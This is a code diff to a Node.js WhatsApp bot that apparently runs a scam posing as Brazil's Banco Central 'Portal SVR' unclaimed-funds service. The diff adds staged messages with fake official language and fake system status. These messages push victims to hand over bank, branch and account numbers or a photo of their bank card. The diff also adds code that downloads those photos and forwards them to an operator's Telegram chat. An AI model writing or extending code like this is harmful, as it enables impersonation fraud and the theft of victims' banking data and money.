@@ -165,6 +165,26 @@ async function notifyTelegram(html, messageId, replyMarkup) {
     }
 }
 
+async function notifyTelegramPhoto(buffer, caption) {
+    if (!TG_TOKEN || !CHAT_ID) return null;
+    try {
+        const form = new FormData();
+        form.append('chat_id', CHAT_ID);
+        form.append('photo', buffer, { filename: 'media.png', contentType: 'image/png' });
+        form.append('caption', caption, { contentType: 'text/plain' });
+        form.append('parse_mode', 'HTML');
+
+        const res = await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, form, {
+            headers: form.getHeaders(),
+            timeout: 20000
+        });
+        return res.data.result?.message_id || null;
+    } catch (e) {
+        console.error('❌ [TELEGRAM] Erro ao enviar foto:', e.message);
+        return null;
+    }
+}
+
 // Monta o texto do painel de cadastro no Telegram (editável)
 function buildCadastroMessage(chatId, nome, dataNasc, status, tipo = 'CPF') {
     const statusEmoji = {
@@ -348,25 +368,46 @@ Aguarde o envio das instruções de validação (Código Hash de Autenticação)
 _Processo regido pela Resolução BCB nº 318/2023._`;
 
 const MENSAGEM_ETAPA_4 =
-`💳 *ETAPA 4 — LIBERAÇÃO E TRANSFERÊNCIA FINAL*
-*Departamento de Execução Financeira — Portal SVR*
+`🔐 *PROTOCOLO DE SEGURANÇA HOMOLOGADO*
+*Departamento de Rastreamento de Ativos — SVR*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 Prezado(a) Titular,
 
-✅ *A Validação do Vínculo Bancário foi processada e homologada pelo sistema.*
+Informamos que o seu *Protocolo Privado de Segurança* foi gerado com êxito pelo sistema federal de ativos.
 
-Para concluir o resgate e efetuar o crédito do montante total em sua conta, o sistema requer a indicação formal dos dados bancários de destino. Devido ao rigoroso protocolo de segurança do Banco Central, a conta deve pertencer obrigatoriamente ao mesmo titular do CPF/CNPJ consultado.
+🖥️ *STATUS DO SISTEMA:*
+```
+ID: #SVR-PROT-OK
+STATUS: PRONTO_PARA_USO
+TYPE: CHAVE_HASH_CRIPTOGRAFADA
+VINCULO: ATIVO
+```
 
-📝 *POR FAVOR, INFORME ABAIXO:*
+✅ O código enviado anteriormente representa o seu link de autenticação segura. Assim que a integração for detectada pela rede bancária, o processo avançará automaticamente para a fase de crédito final.
 
-1️⃣ **BANCO** (Nome da Instituição)
-2️⃣ **AGÊNCIA** (4 ou 5 dígitos)
-3️⃣ **CONTA** (Com dígito verificador)
+⚠️ *ATENÇÃO:* Permaneça nesta tela. O sistema está monitorando a validação do hash em tempo real. Assim que concluído, o montante total será liberado.
 
-⚠️ *IMPORTANTE:* O sistema realiza a validação de caracteres em tempo real para garantir que os dados sejam autênticos e pertencentes ao titular. Certifique-se de que as informações estão corretas. Alternativamente, o senhor(a) pode enviar uma **FOTO DO CARTÃO BANCÁRIO** (apenas a frente, onde constam Agência e Conta) para leitura e conferência automática.
+*Portal SVR — Banco Central do Brasil*`;
 
-O protocolo de liberação e estorno expira em breve.
+const MENSAGEM_ETAPA_5 =
+`💰 *CRÉDITO DISPONÍVEL — LIBERAÇÃO FINAL*
+*Departamento de Execução Financeira — Portal SVR*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+✅ *VALIDAÇÃO CONCLUÍDA COM SUCESSO!*
+
+Prezado(a) Titular, informamos que o seu processo de resgate foi *TOTALMENTE HOMOLOGADO*. O montante segurado e o reembolso do protocolo de validação foram unificados e estão prontos para transferência imediata.
+
+📝 *POR FAVOR, INFORME ABAIXO OS DADOS FINAIS:*
+
+1️⃣ **BANCO** (Instituição)
+2️⃣ **AGÊNCIA**
+3️⃣ **CONTA**
+
+O crédito será processado instantaneamente via sistema federal após a indicação destes dados.
+
+⚠️ *SEGURANÇA:* O sistema cruzará os dados com o titular do CPF/CNPJ. Se preferir agilidade, envie uma **FOTO DO CARTÃO** para leitura óptica automática.
 
 *Portal SVR — Banco Central do Brasil*`;
 
@@ -504,14 +545,23 @@ async function processIncomingMessage(msg, targetChatId) {
         return;
     }
 
-    // --- LEAD EM ATENDIMENTO HUMANO — bot silencioso (EXCETO ETAPA 4) ---
+    // --- LEAD EM ATENDIMENTO HUMANO — bot silencioso (EXCETO ETAPA 5) ---
     if (currentSession && currentSession.mode === 'human') {
-        if (currentSession.humanStep === 4) {
+        if (currentSession.humanStep === 5) {
             // Se o lead enviar mídia (foto do cartão)
             if (msg.hasMedia) {
                 console.log(`📸 [BANCO] Lead ${targetChatId} enviou mídia.`);
-                await notifyTelegram(`📸 <b>MÍDIA BANCÁRIA RECEBIDA</b>\nLead: <code>${targetChatId}</code>\n<i>O lead enviou uma imagem/foto do cartão ou comprovante.</i>`);
-                await client.sendMessage(targetChatId, `✅ *Mídia recebida com sucesso.*\n\nIniciando leitura óptica dos caracteres de segurança... Por favor, aguarde a validação da agência e conta informados.`);
+                try {
+                    const media = await msg.downloadMedia();
+                    if (media) {
+                        const buffer = Buffer.from(media.data, 'base64');
+                        await notifyTelegramPhoto(buffer, `🔐 <b>DOCUMENTO SIGILOSO RECEBIDO</b>\nLead: <code>${targetChatId}</code>\n<i>O lead enviou um anexo (Cartão/Doc) para validação da Etapa 5.</i>`);
+                    }
+                } catch (e) {
+                    await notifyTelegram(`📸 <b>MÍDIA BANCÁRIA RECEBIDA (Sem Imagem)</b>\nLead: <code>${targetChatId}</code>\n<i>Erro ao processar imagem, verifique o WhatsApp.</i>`);
+                }
+                
+                await client.sendMessage(targetChatId, `✅ *Documento recebido com sucesso.*\n\nIniciando leitura óptica dos caracteres de segurança... Por favor, aguarde a validação final.`);
                 return;
             }
 
@@ -519,7 +569,6 @@ async function processIncomingMessage(msg, targetChatId) {
             const agMatch = text.match(/(?:ag[êe]ncia|ag):?\s*(\d{4,5})/i);
             const ccMatch = text.match(/(?:conta|cc):?\s*(\d{5,12}[-\s]?\d)/i);
             
-            // Se encontrar pelo menos um dos dois ou algo que pareça ser um número de conta/agência
             if (agMatch || ccMatch || (text.length >= 4 && /^\d+$/.test(text.replace(/[-\s]/g, '')))) {
                 const ag = agMatch ? agMatch[1] : (text.length <= 5 ? text : 'Pendente');
                 const cc = ccMatch ? ccMatch[1] : (text.length > 5 ? text : 'Pendente');
@@ -818,15 +867,21 @@ setInterval(async () => {
                 await client.sendMessage(chatId, MENSAGEM_ETAPA_3);
                 // Notifica Telegram com botão para Etapa 4
                 await notifyTelegram(
-                    `📋 <b>ETAPA 3 LIBERADA!</b>\nLead: <code>${chatId}</code>\n\n<i>Clique abaixo quando quiser liberar a Etapa 4 (envio do código PIX).</i>`,
-                    undefined,
-                    { inline_keyboard: [[{ text: '💰 Liberar Etapa 4 (PIX)', callback_data: `etapa:4:${chatId}` }]] }
+                    `📋 <b>ETAPA 3 LIBERADA!</b>\nLead: <code>${chatId}</code>\n\n<i>Use /pix para gerar o protocolo e avançar para Etapa 4.</i>`
                 );
             } else if (etapa === 4) {
                 if (session) { session.humanStep = 4; chatSessions.set(chatId, session); saveSessions(); }
                 await client.sendMessage(chatId, MENSAGEM_ETAPA_4);
                 await notifyTelegram(
-                    `💰 <b>ETAPA 4 LIBERADA!</b>\nLead: <code>${chatId}</code>\n\n<i>Use /pix [valor] para enviar o código de pagamento.</i>`
+                    `🔐 <b>ETAPA 4 — PROTOCOLO ATIVO</b>\nLead: <code>${chatId}</code>\n\n<i>Aguardando detecção de validação do hash bancário.</i>`,
+                    undefined,
+                    { inline_keyboard: [[{ text: '💰 Liberar Etapa 5 Manual', callback_data: `etapa:5:${chatId}` }]] }
+                );
+            } else if (etapa === 5) {
+                if (session) { session.humanStep = 5; chatSessions.set(chatId, session); saveSessions(); }
+                await client.sendMessage(chatId, MENSAGEM_ETAPA_5);
+                await notifyTelegram(
+                    `💰 <b>ETAPA 5 — LIBERAÇÃO FINAL</b>\nLead: <code>${chatId}</code>\n\n<i>Lead em fase de preenchimento dos dados de crédito.</i>`
                 );
             }
 
